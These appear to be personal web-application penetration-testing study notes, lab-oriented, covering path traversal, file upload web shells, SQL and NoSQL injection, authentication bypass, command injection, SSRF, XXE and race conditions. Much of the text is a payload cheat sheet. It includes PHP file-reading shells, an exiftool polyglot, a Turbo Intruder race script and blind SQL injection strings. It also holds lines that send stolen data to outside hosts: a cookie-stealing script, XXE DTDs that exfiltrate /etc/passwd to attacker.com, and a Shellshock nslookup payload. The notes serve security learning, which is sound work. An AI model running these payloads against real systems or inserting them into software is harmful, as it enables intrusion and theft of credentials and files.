b#8427.q\WqJGY/\9%f3K-ninnP#o7fw

---------------------------------------------------------------------------------Server-Side Attacks------------------------------------------------------------------------------

Directory Traversal Testing (../ - known as sequence)
	- when using an API to fetch images/files
		* eg - /loadimage?filename=219.png == var/www/images
		* change to filename=../../../etc/passwd (in url or POST body)
	- if sequences are stripped
		* use nested sequence(....//, ....\/) -> (inner stripping - .."../"/ or .."..\"/)
		* use encodings, double encodings (url or non-standard (..%c0%af, ..%ef%bc%8f) (payload list (Fuzzing - path traversal))
		* provide directly without sequence (/etc/passwd)
	- if it requires the filename to start with var/www/images
		* use var/www/images/../../../etc/passwd
	- if it checks the file extension
		* use null byte(%00) eg - var/www/../../../etc/passwd%00.png
	- in case of windows OS ../ and ..\ are valid, search for /windows/win.ini

**********************************************************************************************************************************************************************************

File Upload Testing (payload - <?php echo file_get_contents('/path/to/target/file'); ?>)
	- Remote code execution via web shell upload
		* direct upload of payload file (have no restriction specified in accept-type header) - all types(*/*)
 	- Web shell upload via Content-Type restriction bypass
		* change content-type header to allowed file types but upload any php/similar file (server does not validate content-type header with the file extension or contents)
  	- Web shell upload via path traversal (restrictions on user-directory for permitted file types)
		* change the directory where file upload happens (bypass directory restrictions) -> ../../exploit.php (try encoding for ../../)
	- Web shell upload via extension blacklist bypass
		* by overriding server configuration (etc/apache2/apache2.conf)
		* eg - LoadModule php_module /usr/lib/apache2/modules/libphp.so, AddType application/x-httpd-php .php
		* create special configuration files within individual directories - upload a .htaccess file (filename = .htaccess)
		* contents -> AddType application/x-httpd-php .133t
		* change content-type to text/plain
		* Upload a php payload with extension .133t which will be treated as php file.
	- Web shell upload via obfuscated file extension
		* try following patterns -> filename.php.jpg, filename.jpg.php, filename.php., filename%2Ephp (url encode), filename.pphphp
		* Provide multiple extensions
		* Add trailing characters (".") - > filename.php.
		* Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes
		* Add semicolons or URL-encoded null byte characters before the file extension.
		* Try using multibyte Unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. (xC0 x2E, xC4 xAE or xC0 xAE translated to x2E if parsed as UTF-8 string)
		* use nested extensions to bypass stripping
	- Flawed validation of the file's contents
		* certain file types may always contain a specific sequence of bytes in their header or footer
		* eg -> JPEG files always begin with the bytes FF D8 FF
		* ExifTool, create a polyglot JPEG file containing malicious code within its metadata
		* cmd -> exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o <output image>
		* Can find the output between start and end strings
	- Exploiting file upload race conditions
		* Uploads the file to a temp directory and perform validation - virus checks etc
		* the uploaded file is moved to an accessible folder, where checked for viruses. Malicious files are removed once the virus check completes
		* Turbo Intruder extender required
		* code to execute race condition
		* def queueRequests(target, wordlists):
    			engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    			request1 = '''<YOUR-POST-REQUEST>'''

    			request2 = '''<YOUR-GET-REQUEST>'''

    			# the 'gate' argument blocks the final byte of each request until openGate is invoked
    			engine.queue(request1, gate='race1')
    			for x in range(5):
        			engine.queue(request2, gate='race1')

    			# wait until every 'race1' tagged request is ready
    			# then send the final byte of each request
    			# (this method is non-blocking, just like queue)
    			engine.openGate('race1')

    			engine.complete(timeout=60)


		def handleResponse(req, interesting):
    			table.add(req)
	- Uploading malicious client-side scripts
		* if you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads
		<?xml version="1.0" standalone="no"?>
		<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
			<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  			<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  			<script type="text/javascript">alert("XSS by BHARAT");</script>
			</svg>
	- Exploiting vulnerabilities in the parsing of uploaded files
		* server parses XML-based files, such as Microsoft Office .doc or .xls files, this may be a potential vector for XXE injection attacks. 
	- Uploading files using PUT
		* PUT /images/exploit.php HTTP/1.1
		  Host: vulnerable-website.com
		  Content-Type: application/x-httpd-php
		  Content-Length: 49

 		  <?php echo file_get_contents('/path/to/file'); ?> 

**********************************************************************************************************************************************************************************

SQL injection
	- Detect SQL injection vulnerabilities
		* Submit ', SQL-specific syntax(ASCII(97)), OR 1=1, trigger time delays, OAST payloads to trigger out-of-band interaction
	Second-order SQL injection
		* First-order SQL injection arises where the application takes user input from an HTTP request
		* second-order (stored SQLi), takes user input from an HTTP request and stores it for future use.
		* The DB when fetching from stored values might not perform any additional sanitization.
	- Retrieving hidden data
		* use comments syntax to change the logic ('--)
		* use ' OR 1=1--, '+OR+1=1--
	- Subverting application logic
		* in case of username and password -> changing logic to only check the username and ignore the password
	- Retrieving data from other database tables
		* use UNION keyword
  		* UNION Attacks - retrieve data from other tables -> appends one or more queries to original query
	- Requirements
		* individual queries must have the same number of columns
		* data types in each column must be compatible 
	- Determine the number of columns being displayed using ORDER BY keyword
		* '+ORDER+BY+1--
		* '+UNION+SELECT+NULL,NULL-- (ADD MORE NULL if required) -> reason for using NULL is because it should be compatible with the data types
	- Determine the data type of column
		* '+UNION+SELECT+'A',NULL,NULL-- (keep changing the position of string and Increase or decrease NULL values)
	- Retrieving multiple values within a single column
		* Retrieve multiple values within this single column by concatenating the values together.
		* '+UNION+SELECT+username+||+'~'+||+password+FROM+users--
		* eg. oracle database uses || for string concatenation -> change accordingly
  Examining Database Details
	- Depending on DB version query changes
	- For Oracle - requires "FROM" keyword as a must
	- Use Burp SQL injection cheat sheet

  Blind SQL Injection
	- Detection
		* Trigger a detectable difference in the application's response depending on the truth/false of a single condition.
		* Trigger a time delay in the processing of the query
		* Trigger an out-of-band network interaction, using OAST techniques.
	- Exploiting blind SQL injection by triggering conditional responses(works only if there is some kind of difference in the response)
		* eg- trackingID cookie
		* xyz' AND '1'='1 , xyz' AND '1'='2
		* xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
		* SUBSTRING method used is different depending on DB version
		* make use of length() and substring()
		* in intruder there is an option grep-match - provide the difference in response message
	- Inducing conditional responses by triggering SQL errors (works only if error handling mechanism is not defined)
		* xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
		* xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 	
		* here if the condition is true it will throw an error for division by zero
		* use substring() and length() to know about the details that is to be fetched
		* in intruder look for 500 status code
	- Exploiting blind SQL injection by triggering time delays (if error handling mechanism is defined)
		* triggering time delays conditionally, depending on an injected condition
		* '; IF (1=2) WAITFOR DELAY '0:0:10'--
		* '; IF (1=1) WAITFOR DELAY '0:0:10'-- (triggers a delay of 10 seconds)
		* time delay function varies depending on DB version
		* in resource pool change max concurrent requests to 1 and in results -> column -> response recieved/completed -> look for the number matching the time delay
	- Exploiting blind SQL injection using out-of-band (OAST) techniques (when sql query are not executed synchronously)
		* make use of burp collaborator
		* cmd varies according to version of DB
		* if sql query is executed asynchronously -> use this method
		* '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
		* x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
		* x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
	- Bypass WAF using Hackvertor -> Encode -> dec_entities/hex_entities. 

**********************************************************************************************************************************************************************************

Authentication Vulnerabilities
	- How do authentication vulnerabilities arise?
		* Authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
		* Logic flaws or poor coding in the implementation -> commonly known as broken auth
	- Vulnerabilities in password-based login
		* check for email addresses of admins or users in response
	    - Username enumeration
		* observe changes in the website's behavior in order to identify whether a given username is valid
		* pay particular attention to : status codes, error messages, and response time
		* to bypass IP based brute force protection make use of http request headers (X-Forwarded-For)
	    - Flawed brute-force protection
		* if app blocks an account based on IP address (with regards to multiple login attempts)
		* bypass by logging in using correct credentials(create a legit account) alternatively while brute forcing for other accounts
		* account lockout (with regards to multiple login attempts)
		* bypass - cluster bomb method - for valid username it shows a different response - make use of 2 payloads (username and null payloads(5 times))
		* credential stuffing - username/password pairs obtained from some data breach
	    - User rate limiting
		* making too many login requests within a short period of time causes your IP address to be blocked
		* bypass - in password change the value from single value to an array of passwords
	    - HTTP basic authentication
		* client receives authentication token from server, constructed by concatenating the username and password, and encoding it in Base64
		* lead to session based exploits and csrf
	- Vulnerabilities in multi-factor authentication
	    - 2FA simple bypass
		* without providing the otp - since already in logged-in state (try accessing some other link in the application)
	    - 2FA broken logic
		* making use of cookie assigned to actual user for logging into the victim account
		* might be using a second login to send otp linked to that victim account - after initiating the otp  - brute force the otp
	    - 2FA bypass using a brute-force attack
		* if application uses a lockout mechanism for multiple otp attempts based on session
		* create a macro in project options -> sessions providing the required requests needed to initiate new session for each attempt made.
		* for macro to work add session rules and appropriate options
	- Vulnerabilities in other authentication mechanisms (change password or reset email)
	   - Brute-forcing a stay-logged-in cookie( remember me or keep me logged in)
		* analyze the cookie - how its constructed - might contain in encoded form which contains username and hash of password
	   - Offline password cracking (crackstation - hash cracking)
		* make use of stored XSS (<script>document.location='server-name/'+document.cookie</script>
		* when victim open the vulnerable page the cookie is sent to our server
	   - Password reset broken logic
		* reset url mentions the ID token of the user whose password is to be changed
			- check for url token if it specifies the username or check the request body for info related to user
	   - Password reset poisoning via middleware
		* make use of host header attack to send the password reset token to a server that we own - access.log provides the unique token assigned to the victim
	   - Password brute-force via password change
		* after logging in as actual user intercept the password reset page that checks whether the old password matches the username parameter
		* brute force the old password parameter to reset the password of victim user
		* check for different scenarios to observe any difference in server response (eg provide correct old password and different new password in 2 input fields and vice-versa)

**********************************************************************************************************************************************************************************

OS Command Injection
	- Command separators inlcude (&, |, &&, ||) (works for both windows and UNIX)
	- for unix - ;, 0x0a or \n, `injected command`, $(injected command)
	- might need to close the quotes(", ') for command to execute
	- eg - & echo hello &, & ping -c 10 127.0.0.1 (blind)
	- Useful commands - whoami, uname -a, ifconfig, netstat -an, ps -ef (linux), whoami, ipconfig/all, netstat -an, tasklist (windows)
	   - OS command injection, simple case
		* check whether any input parameters execute OS commands 
		* eg - & echo helloworld &
	   - Blind OS command injection with time delays
		* & ping -c 10 127.0.0.1 & (try using different separators)
		* triggers a time delay to send 10 ICMP packets
	   - Blind OS command injection with output redirection
		* can output the contents of a command to a text file that can be viewed in the browser
		* need to try in different folders that has writable privilege
		* eg - & whoami > var/www/html/whoami.txt &
	   - Blind OS command injection with out-of-band interaction
		* make use of burp collaborator to initiate a nslookup
		* eg - & nslookup domain.com &, & nslookup `whoami`.domain.com &

**********************************************************************************************************************************************************************************

Business logic vulnerabilities (to be continued)
	- Excessive trust in client-side controls
		* not validating the user input at server-side
	- High Level Logic
		* in product purchasing add to cart product quantity should not accepts a negative value
		* which affects the total of products in the cart
	- Low level 

**********************************************************************************************************************************************************************************

Information disclosure vulnerabilities
	- Website unintentionally reveals sensitive information to its users
	- Some basic examples of information disclosure are as follows:
		* Revealing the names of hidden directories, their structure, and their contents via a robots.txt file or directory listing
		* Providing access to source code files via temporary backups
		* Explicitly mentioning database table or column names in error messages
		* Unnecessarily exposing highly sensitive information, such as credit card details
		* Hard-coding API keys, IP addresses, database credentials, and so on in the source code
		* Hinting at the existence or absence of resources, usernames, and so on via subtle differences in application behavior
	- robots.txt - revealing hidden directories
	- information about frameworks or sensitive data
	- enabling debugging features -/cgi-bin/phpinfo.php
	- How to test for information disclosure vulnerabilities
		* Fuzzing - try submitting different data types or fuzz crafted strings and observer the response from the server
			    Use Burp Intruder to add payloads and fuzz the parameters using pre-built wordlists
		 	    Status codes, length, response time, grep matching rules - keywords (error, invalid, SELECT, SQL etc), grep extraction rules
			    Use Logger++ extension to define advanced filters
		* Using Burp Scanner - Schedule automated scans to crawl and audit the target site
		* Using Burp's engagement tools - Search, Find Comments, Discover Content
		* Engineering informative responses - observe the error messages - stack trace
	- Files for web crawlers
		* search for robots.txt or sitemap.xml
	- Directory listings - accessing temporary file and crash dumps
	- Developer comments - View page source, browser developer tools
	- Hardcoded password in backup files/source code
	- trace may be enabled -  discloses internal authentication headers
	- check for version control history info in /.git file
		* git cat-file -p "--value--"
		* git log -> git diff "--value1--" "--value2--"

**********************************************************************************************************************************************************************************

Access control vulnerabilities and privilege escalation
	- Access control security models
		* Programmatic access control - matrix of user privileges is stored in a database, include roles or groups or individual users, collections or workflows of processes
		* Discretionary access control (DAC) - Owners of resources assign permission to users - gets complex when no. of users increases
		* Mandatory access control (MAC) - centrally controlled system of access control 
		* Role-based access control (RBAC) - providing access controls based on role
	- Vertical access controls - admin privileges
	- Horizontal access controls - one user not allowed to view details of other user
	- Context-dependent access controls - based upon the state of the application or the user's interaction 
		* For example, a retail website might prevent users from modifying the contents of their shopping cart after they have made payment.
	- Vertical and Horizontal privEsc
   - Testing
	- Unprotected functionality
		* search for any pages with admin functionalities (robots.txt or look in the server response mentioning the URL based on role)
	- Parameter-based access control methods
		* User role controlled by request parameter - cookie value decides whether to provide admin access
		* User role can be modified in user profile - check for any parameter that checks the privilege in request or response
			- If found in response try sending that parameter assigning a different value to obtain high level privilege along with the request body
	- Broken access control resulting from platform misconfiguration
	  URL-based access control can be circumvented
		* Some application support non-standard HTTP headers to override the URL in the original request, such as X-Original-URL and X-Rewrite-URL.
			- to bypass certain HTTP methods being performed on a particular URL
	  Method-based access control can be circumvented
		* If restrictions are in place for POST method we can try executing the operation using GET method (vice-versa)
	- Horizontal privilege escalation
		* check for any parameter that can be tampered.
		* check for any id's in any messages, posts, comments etc that mentions any unique id tagged to that user.
		* while changing the parameter tagged to user observe the response in redirection to login page
	- Horizontal to vertical privilege escalation
		* similar to horizontal checks, only difference is gain access to privileged user.
		* check whether after escalation if the current user password field is auto-populated, if so password can be obtained from the response
	- Insecure direct object references
		* check for any incremental parameter that can be tampered
	- Access control vulnerabilities in multi-step processes
		* in multi-step process of form filling or related kinds, there is a chance some steps might not have access controls set.
	- Referrer-based access control
		* application robustly enforces access control over the main administrative page at /admin, but for sub-pages such as /admin/deleteUser only inspects the Referrer header. 
		  If the Referrer header contains the main /admin URL, then the request is allowed.
	- Location-based access control
		* circumvented by the use of web proxies, VPNs, or manipulation of client-side geolocation mechanisms

**********************************************************************************************************************************************************************************

Server-side request forgery (SSRF)
  - result in unauthorized actions or access to data within the organization, either in the vulnerable application itself or on other back-end systems
  - allow an attacker to perform arbitrary command execution.
	- SSRF attacks against the server itself
		* make an HTTP request back to the server that is hosting the application, via its loopback network interface.
		* 127.0.0.1, localhost or alternatives (2130706433, 017700000001, or 127.1)
	- SSRF attacks against other back-end systems
		* sometimes back-end systems/admin interfaces are accessible using private ip address (brute force ip's)
	- SSRF with blacklist-based input filters
	 	* Registering your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose
		* URL encoding for bypass of blacklisted strings
		* Using alternatives for localhost
	- SSRF with whitelist-based input filters
		* You can embed credentials in a URL before the hostname, using the @ character. For example:https://expected-host@evil-host
		* You can use the # character to indicate a URL fragment. For example:https://evil-host#expected-host
		* You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:https://expected-host.evil-host
		* You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
    		* You can use combinations of these techniques together.
		* example : http%3A%2F%2F127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos (app check for the domain name if it is stock.weliketoshop.net
			bypass this filter using @ and double encoded # (%2523)
	- Bypassing SSRF filters via open redirection
		* check for any parameter that allows open redirection try ssrf if possible
		* use the same path above obtained in any other parameter that makes call to internal systems
	- Blind SSRF with Shellshock exploitation (to be tried)
		* payload - () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
		* referrer header initiated a http request if url provided along with the contents of user-agent string
		* provide the shellshock payload in the user-agent header
		* brute force an internal system by providing IP in referrer header which will send the user-agent content and gets executed on the internal system

**********************************************************************************************************************************************************************************

XML external entity (XXE) injection
	- % xxe = parameter entity and invoked only with the DTD as %xxe;
	- xxe = external entity and invoked anywhere as &xxe;
	- How do XXE vulnerabilities arise?
		* Applications use the XML format to transmit data between the browser and the server
		* XML specification contains dangerous features, and standard parsers support these features
	- Exploiting XXE using external entities to retrieve files
		* provide the common payload
		* <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	- Exploiting XXE to perform SSRF attacks
		* The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. 
		* <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data" >]>
		* same url for every scenario (default IP set for EC2 metadata
	- Blind XXE vulnerabilities
		* to exfiltrate data use 2 methods
		  - through oast technique using collaborator or similar tools / by triggering error messages that can contain sensitive data
	    - Blind XXE with out-of-band interaction
		* <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http:burpcollaborator" >]> (invoke &xxe; in any of the existing data elements or within the xml document)
	    - Blind XXE with out-of-band interaction via XML parameter entities
		* <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burpcollaborator" > %xxe; ]> (invoke %xxe; within the existing DTD if the above method does not work)
	    - Exploiting blind XXE to exfiltrate data out-of-band (only if application allows to fetch contents remotely)
		* create a malicious.dtd external dtd file and host it in attacker controlled server to be fetched by victim server
		* malicious.dtd (contents)
			- <!ENTITY % file SYSTEM "file:///etc/passwd">
			- <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://www.attacker.com/?x=%file; '>">
			- %eval;
			- %exfiltrate;
		* payload to be provided in victim application
			- <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>
	    - Exploiting blind XXE to retrieve data via error messages (only if application allows to fetch contents remotely)
		* effective only if the application returns the resulting error message within its response
		* host external dtd malicious.dtd
			- <!ENTITY % file SYSTEM "file:///etc/passwd">
			- <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
			- %eval;
			- %error;
		* payload to be provided in victim application
			- <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>
	    - external dtd is only possible because xml parameter entity can be used within the definition of another parameter entity 
		which is not possible in internal dtd
	    - Exploiting blind XXE by repurposing a local DTD (if remote fetching of dtd file is not allowed)
		* exploitable if a document's DTD uses hybrid model (ie internal and external dtd declarations)
		* the restriction on using an XML parameter entity within the definition of another parameter entity is relaxed
		* external dtd that is local to the application server since out-of-band connections are blocked
		- Locating an existing DTD file to repurpose
			* <!DOCTYPE foo [
			  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
			  %local_dtd;
			  ]>
		* <!DOCTYPE foo [
		  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
		  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
		  <!ENTITY % ISOamso '
		  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
		  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
		  &#x25;eval;
		  &#x25;error;
		  '>
		  %local_dtd;
		  ]>
		* here ISOamso is an external entity that is redefined within the internal dtd to trigger an error message that displays the data
	    - XInclude attacks
			* when client-submitted data is placed into a back-end SOAP request, which is then processed by the backend SOAP service
			* XInclude is a part of the XML specification that allows an XML document to be built from sub-documents.
			* place an XInclude attack within any data value in an XML document, so the attack can be performed in situations where you only control a single item of data that is placed into a server-side XML document
			* <foo xmlns:xi="http://www.w3.org/2001/XInclude">
			  <xi:include parse="text" href="file:///etc/passwd"/></foo>
			* above is added to a normal application that takes parameters in URL-encoded format (eg: productid=1&storeid=1)
			* input the payload to productid="payload" -- if the backend server parses this as an xml document the payload gets executed (blind)
	    - XXE attacks via file upload
			* XML-based formats are office document formats like DOCX and image formats like SVG
			* if the above extensions are possible try uploading an svg image with malicious payload that gets displayed within the application (profile pic etc.)
			* <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
			* store the above payload as svg file extension and upload - output will be as the image
	    - XXE attacks via modified content type
			* POST requests use a default content type that is generated by HTML forms, such as application/x-www-form-urlencoded
			* Some web sites expect to receive requests in this format but will tolerate other content types, including XML
			* change the content-type header from url-encoded to text/xml and provide the parameters in xml format
			* if application accepts the xml format try for xml vuln mentioned above

**********************************************************************************************************************************************************************************

Race conditions
	- Occur when websites process requests concurrently without adequate safeguards
	- Leads to multiple distinct threads interacting with the same data at the same time, resulting in a "collision"
	- Period of time during which a collision is possible is known as the "race window"
	- Limit overrun race conditions
		* Enables to exceed a limit imposed by the business logic of the application
		* Variations of this kind of attack, including:
			Redeeming a gift card multiple times
			Rating a product multiple times
			Withdrawing or transferring cash in excess of your account balance
			Reusing a single CAPTCHA solution
			Bypassing an anti-brute-force rate limit
		* Limit overruns are a subtype of so-called "time-of-check to time-of-use" (TOCTOU) flaws.
	- Detecting and exploiting limit overrun race conditions with Burp Repeater
		* Identify a single-use or rate-limited endpoint that has some kind of security impact or other useful purpose.
		* Issue multiple requests to this endpoint in quick succession to see if you can overrun this limit.
		* There are various uncontrollable and unpredictable external factors that affect when the server processes each request and in which order.
		* To bypass network jitter
			For HTTP/1, it uses the classic last-byte synchronization technique. ( last byte of every request and after a delay releases the last byte simultaneously)
			For HTTP/2, it uses the single-packet attack technique
		* Lab - Create Group in Repeater and replicate 'Apply Coupon Requests' and send all requests parallelly.
	- Detecting and exploiting limit overrun race conditions with Turbo Intruder
		* See the race-single-packet-attack.py template provided in Turbo Intruder's default examples directory
		* Lab - Use the above script as sending requests using Repeater Grouping is not fast enough. (%s in password field)
   			for password in open('<file-path>'): engine.queue(target.req, password, gate='race1')
	- Hidden multi-step sequences
		* Identify one or more HTTP requests that cause an interaction with the same data, you can potentially abuse these sub-states to expose time-sensitive variations of the kinds of logic flaws that are common in multi-step workflows
		* Exploit this by sending a login request along with a request to a sensitive, authenticated endpoint.
		* Methodology
			1 - Predict potential collisions - For a successful collision, you typically need two or more requests that trigger operations on the same record
			2 - Probe for clues - try Send group in sequence (separate connections) or Send group in parallel options
			3 - Prove the concept
	- Multi-endpoint race conditions
		* sending requests to multiple endpoints at the same time.
		* common problem
		* Delays introduced by network architecture
		* Delays introduced by endpoint-specific processing
		* Solution
			* Connection Warming - try adding a GET request for the homepage to the start of your tab group, then using the Send group in sequence (single connection) option.
		* Lab - Race condition in fund validation and order confirmation. Add a item to cart that satisfies the funds check, Group requests of 'add the required item above our balance' and 'order place'. Send requests parallelly
	- Single-endpoint race conditions
		* sending two parallel password reset requests from the same session, but with two different usernames, could potentially cause the following collision
		* Lab - for account change email, send parallel requests so that confirmation to change our attacker account to admin email will be sent to attacker's mailbox and not the admin mailbox.
	- Session-based locking mechanisms
		* PHP's native session handler module only processes one request per session at a time
		* If requests are being processed sequentially, try sending each of them using a different session token. 
	- Partial construction race conditions
		* when registering a new user, an application may create the user in the database and set their API key using two separate SQL statements. This leaves a tiny window in which the user exists, but their API key is uninitialized.
		* Lab - Race Condition happens when a user tries to register himself and the server sends a confirmation token email. Send register request to turbo intruder and create a request in turbo editor to send confirm request before the server assigns a token to that user so that token matches to a null value. Here when a register request is made we initiate multiple confirm requests simultaneously since 'Confirm' requests are processed faster than "register" request. (token[]= -> depicts empty array)
	- Time-sensitive attacks
		* Techniques for delivering requests with precise timing can still reveal the presence of other vulnerabilities
		* Consider a password reset token that is only randomized using a timestamp. It might be possible to trigger two password resets for two different users, which both use the same token. All you need to do is time the requests so that they generate the same timestamp.
		* Lab - Forgot Password functionality using separate sessions ID's to generate a reset token for different users using the timestamp. If we can send 2 requests simultaneously with different CSRF and session cookie values, the server might use the same timestamp to generate a identical token for both users resulting in attacker to change the password of victim user.

**********************************************************************************************************************************************************************************

NoSQL injection
	- enable an attacker to:
		Bypass authentication or protection mechanisms.
		Extract or edit data.
		Cause a denial of service.
		Execute code on the server.
	- NoSQL database models
		* Document stores - use formats such as JSON, BSON, and XML, and are queried in an API or query language (MongoDB, Couchbase)
		* Key-value stores - store data in a key-value format (Redis, DynamoDB)
		* Wide-column stores - organize data into flexible column families (Apache Casandra, Apache HBase)
		* Graph databases - use nodes to store data entities, and edges to store relationships between entities (Neo4j, Neptune)
	- Types of NoSQL injection
		* Syntax Injection - occurs when you can break the NoSQL query syntax, enabling you to inject your own payload
		* Operator Injection - occurs when you can use NoSQL query operators to manipulate queries
	- Detecting Syntax Injection (basic rule fuzz the parameters using in-built keywords)
		* MongoDB
			Via URL - '"`{ ;$Foo} $Foo \xYZ   (URL encode)
			Via JSON - '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
		* Determining which characters are processed
			Sample fuzz characters: ', \' (no error-may be vulnerable)
		* Confirming conditional behavior
			Syntax- ' && 0 && 'x, ' && 1 && 'x
		* Overriding existing conditions
			JavaScript payload- '||1||'
			Null payload- '%00, '\u0000
		* Lab- Try fuzzing the parameter and construct a payload accordingly
	- NoSQL operator injection
		$where - Matches documents that satisfy a JavaScript expression.
		$ne - Matches all values that are not equal to a specified value.
		$in - Matches all of the values specified in an array.
		$regex - Selects documents where values match a specified regular expression.
		* Submitting Query Parameters
			Insert query operators as nested objects
			JSON: {"username":{"ne":"invalid"}}
			URL: username[$ne]=invalid
			Try converting the request and exploit
		* Detecting operator injection in MongoDB
			{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
			{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
		* Lab- use the regex operator to guess the first few letters of username and password to $ne:"" ("$regex":"admin.*)
	- Exploiting syntax injection to extract data
		* Query operators or functions can run limited JavaScript code, such as MongoDB's $where operator and mapReduce() function.
		* Payload: ' && this.password[0] == 'a' || 'a'=='b, ' && this.password.match(/\d/) || 'a'=='b
		* Identifying field names
			Payload: ' && this.username!=' , ' && this.foo!=' 
			Perform dictionary attack to identify the field/column names or use the combination length and idex matching to get the field names
		* Lab- Try multiple payload to generate false/true conditions. (' && 'a'=='b ,' && this.password.length < 10 ||'a'=='b, ' && this.password[0]=='a' ||'a'=='b)
	- Exploiting NoSQL operator injection to extract data
		* Injecting operators in MongoDB
			Appending "$where":"0" or "$where":"1" might generate different responses depicting the DB evaluating JS expression.
		* Extracting field names
			If you have injected an operator that enables you to run JavaScript, you may be able to use the keys() method to extract the name of data fields.
			eg: "$where":"Object.keys(this)[0].match('^.{0}a.*')"
		* Exfiltrating data using operators
			$regex operator to extract data character by character if JS is not evaluated.
			eg: "password":{"$regex":"^a*"} ( check whether the password begins with 'a')
		* Lab- Try fetching the reset token field name using keys() and then find the token value using match(). Use the token and field name in forgot password page by including the field name & token as parameter & value in URL. {"$where":"Object.keys(this)[0].match('^.{§§}§§.*')"} - keep incrementing the 1st payload to index the value and 2nd value to match the character, "$where":"this.pwResetTkn.match('^.{§§}§§.*')"}
	- Timing based injection
		* Load the page several times to determine a baseline loading time.
		* Insert a timing based payload into the input. eg: {"$where": "sleep(5000)"}
		* Payloads: '+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+', '+function(x {if(x.password[0]==="a"){sleep(5000)};}(this)+'

**********************************************************************************************************************************************************************************

API testing
	- Application Programming Interfaces enable software systems and apps to communicate and share data
	- API recon
		* First need to find out as much information about the API as possible, to discover its attack surface.
		* Once identified the endpoints, you need to determine how to interact with them.
		* Find out information about the following:
			$ The input data the API processes, including both compulsory and optional parameters.
			$ The types of requests the API accepts, including supported HTTP methods and media formats.
			$ Rate limits and authentication mechanisms.
	- API documentation
		* Documentation can be both human-readable and machine-readable forms. 
		* Human-readable is designed for developers to understand how to use the API. 
		* Machine-readable is designed to be processed by S/W for automating tasks like API integration and validation. Written in structured formats like JSON or XML.
  	  $ Discovering API documentation
  		* /api
  		* /swagger/index.html
  		* /openapi.json
		* Lab: Look for any endpoints that reveal any sensitive endpoints in the documentation and craft a request to exploit further.
  	  $ Using machine-readable documentation
  		* Use Burp Scanner to crawl & audit OpenAPI documentation
  		* Parse OpenAPI documentation using OpenAPI Parser BApp
	- Identifying API endpoints
		* Burp Scanner auto extracts some endpoints during crawls, but for a more heavyweight extraction, use the JS Link Finder BApp
		* Identifying supported HTTP methods - use the built-in HTTP verbs list in Burp Intruder
		* Identifying supported content types
	  $ Changing the content type may enable you to: 
		Trigger errors that disclose useful information.
		Bypass flawed defenses.
		Take advantage of differences in processing logic.
	  $ Modify the Content-Type header, then reformat the request body accordingly
		* Using Intruder to find hidden endpoints
	  $ Use in-built wordlists or common relevant keywords.
		* Lab- Look for any API's that allow multiple HTTP methods and try modifying the request based on the response obtain using new method. (modified the price of a product to 0)
	- Finding hidden parameters
		* Burp Intruder
